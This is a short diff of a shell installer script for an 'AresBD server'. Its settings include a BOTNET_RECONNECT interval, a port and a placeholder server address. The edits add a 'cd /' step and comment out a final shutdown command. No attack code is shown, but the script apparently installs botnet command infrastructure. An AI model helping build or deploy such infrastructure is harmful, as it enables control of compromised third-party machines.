@@ -10,6 +10,8 @@ BOTNET_RECONNECT=300
 PORT=2222
 SERVER=YOUR.SERVER
 
+cd /
+
 echo "Welcome to the AresBD server installer."
 echo "Using port $PORT"
 echo "Using server $SERVER"
@@ -144,4 +146,4 @@ echo "Install Complete."
 echo ""
 
 echo "Shutting down..."
-shutdown -h now
+#shutdown -h now
